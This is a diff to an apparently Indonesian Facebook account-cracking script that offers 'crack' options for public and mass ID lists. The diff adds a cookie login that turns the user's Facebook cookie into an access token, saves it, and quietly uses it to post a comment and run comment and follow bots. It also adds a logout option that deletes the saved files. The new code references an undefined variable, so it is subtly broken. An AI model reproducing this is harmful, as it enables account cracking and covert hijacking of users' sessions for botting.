@@ -366,7 +366,33 @@ def login():
     except IOError:
         login123()
 
-def logincoki() -> None:
+###-----[ BAGIAN LOGIN ]-----###
+def logincoki():
+	try:
+		os.system('cls' if os.name == 'nt' else 'clear')
+		# Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook,Saran jangan Menggunkan Cookies Pribadi[italic white]",subtitle="╭───",subtitle_align="left"))
+		cookie = Console().input(f" {H2}• {P2}cookie : ")
+		open('.fancookie.txt','w').write(cok)
+		with requests.Session() as r:
+			try:
+				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
+				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
+				if  '"access_token":' in str(response.headers):
+					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
+					open('.fantoken.txt','w').write(token)
+					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
+					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cookie})
+					bot_komen(cok, token)
+					bot_follow(cok, token)
+					#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
+				else:Console().print(f" {H2}• {P2}[bold red]Cookie Invalid");exit()
+			except Exception as e:print(e);exit()
+		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
+		sleep(2);exit()
+	except Exception as e:os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt');print(e);exit()
+
+
+def logincokii() -> None:
     cookie = Console().input(f" {H2}• {P2}cookie : ")
     try:
         # Update headers untuk request
@@ -568,13 +594,17 @@ def menu():
     console.print(Columns(dia))
     prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik
 [{color_text}02{P2}]. crack dari id Masal
-[{color_text}03{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
+[{color_text}03{P2}]. Logout [[bold red]hapus cookie[P2]]
+[{color_text}04{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
     HaHi = console.input(f" {H2}• {P2}pilih menu : ")
     if HaHi in ["1", "01"]:
         dump_publik()
     elif HaHi in ["2", "02"]:
         massal()
     elif HaHi in ["3", "03"]:
+        os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
+        console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
+    elif HaHi in ["4", "04"]:
         exit()
     else:
     	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")
